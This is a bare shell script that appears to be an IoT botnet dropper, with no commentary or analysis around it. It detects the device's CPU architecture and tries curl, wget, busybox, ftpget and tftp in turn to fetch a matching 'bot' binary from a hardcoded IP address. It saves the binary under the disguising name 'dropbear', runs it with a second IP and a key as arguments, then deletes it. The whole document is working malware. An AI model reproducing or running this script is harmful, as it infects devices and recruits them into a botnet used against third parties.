#!/bin/sh

X="http://185.205.194.15"
X_HOST="185.205.194.15"

TMPDIR=/tmp
for d in /tmp /var/tmp /var/run /dev/shm /mnt /root /; do
    if ( cd "$d" 2>/dev/null && : > .wtest.$$ ) 2>/dev/null; then
        TMPDIR="$d"
        rm -f "$d/.wtest.$$"
        break
    fi
done
TMPDIR=${TMPDIR%/}
[ -n "$TMPDIR" ] || TMPDIR=/tmp

select_endpoints() {
    _arch=$(uname -m 2>/dev/null | tr 'A-Z' 'a-z')
    _arch=$(printf '%s' "$_arch" | /usr/bin/tr 'A-Z' 'a-z')
    case "$_arch" in
        *mips64el*|*mips64le*)
            printf '%s\n' /bots_mips64le /bot_mips64 /bot_mips64le
            ;;
        *mips64*)
            printf '%s\n' /bot_mips64 /bots_mips64le /bot_mips64le
            ;;
        *mipsel*|*mipsle*)
            printf '%s\n' /bots_mipsle /bot_mipsle /bot_mips
            ;;
        *mips*)
            printf '%s\n' /bot_mips /bot_mipsle /bots_mipsle
            ;;
        *aarch64*|*arm64*|*armv8*)
            printf '%s\n' /bot_arm64 /bot_arm
            ;;
        *arm*)
            printf '%s\n' /bot_arm /bot_arm64
            ;;
        *ppc64le*|*ppc64el*)
            printf '%s\n' /bot_ppc64le /bot_ppc64
            ;;
        *ppc64*)
            printf '%s\n' /bot_ppc64 /bot_ppc64le
            ;;
        *ppc*|*powerpc*)
            printf '%s\n' /bot_ppc64 /bot_ppc64le
            ;;
        *)
            return 1
            ;;
    esac
    return 0
}

fetch_one() {
    _url="$1"
    _name="$2"
    _out="${TMPDIR%/}/$_name"

    [ -d "$TMPDIR" ] || return 1

    if command -v curl >/dev/null 2>&1; then
        curl -fsSLk "$_url" -o "$_out" 2>/dev/null && [ -s "$_out" ] && return 0
        curl -fsSL  "$_url" -o "$_out" 2>/dev/null && [ -s "$_out" ] && return 0
    fi

    if command -v wget >/dev/null 2>&1; then
        wget -q --no-check-certificate -O "$_out" "$_url" 2>/dev/null && [ -s "$_out" ] && return 0
        wget -q -O "$_out" "$_url" 2>/dev/null && [ -s "$_out" ] && return 0
    fi

    if command -v lwp-download >/dev/null 2>&1; then
        lwp-download "$_url" "$_out" >/dev/null 2>&1 && [ -s "$_out" ] && return 0
    fi

    if command -v busybox >/dev/null 2>&1; then
        busybox wget -q -O "$_out" "$_url" 2>/dev/null && [ -s "$_out" ] && return 0
    fi

    if command -v ftpget >/dev/null 2>&1; then
        _remote="${_url##*/}"
        _host="${X_HOST:-${X#*://}}"
        _host="${_host%%/*}"

        ftpget -v -u anonymous -p anonymous -P 21 \
            "$_host" "$_out" "$_remote" >/dev/null 2>&1 \
            && [ -s "$_out" ] && return 0
    fi

    if command -v tftp >/dev/null 2>&1; then
        _remote="${_url##*/}"
        _host="${X_HOST:-${X#*://}}"
        _host="${_host%%/*}"

        ( cd "$TMPDIR" 2>/dev/null && tftp "$_host" -c get "$_remote" "$_name" ) >/dev/null 2>&1 \
            && [ -s "$_out" ] && return 0

        ( cd "$TMPDIR" 2>/dev/null && tftp -r "$_remote" -g "$_host" ) >/dev/null 2>&1 \
            && [ -s "${TMPDIR%/}/$_remote" ] && {
                [ "$_remote" = "$_name" ] || mv -f "${TMPDIR%/}/$_remote" "$_out" 2>/dev/null
                [ -s "$_out" ] && return 0
            }

        if command -v busybox >/dev/null 2>&1; then
            busybox tftp -g -r "$_remote" -l "$_out" "$_host" >/dev/null 2>&1 \
                && [ -s "$_out" ] && return 0
        fi
    fi

    return 1
}

download_bot() {
    _endpoints=$(select_endpoints) || return 1

    _name="dropbear"
    _path="${TMPDIR%/}/$_name"

    _cleanup() { rm -f "$_path" 2>/dev/null; }
    trap '_cleanup' EXIT HUP INT TERM

    for _ep in $_endpoints; do
        _url="${X}${_ep}"
        if fetch_one "$_url" "$_name"; then
            chmod +x "$_path" 2>/dev/null || return 1
            "$_path" -f 51.195.218.217 166bd2b96d6082af6949d24ec4166ecbd2ae084125ab789c8b723fbfd304c5d6
            _rc=$?
            _cleanup
            trap - EXIT HUP INT TERM
            return $_rc
        fi
    done

    return 1
}

download_bot
exit $?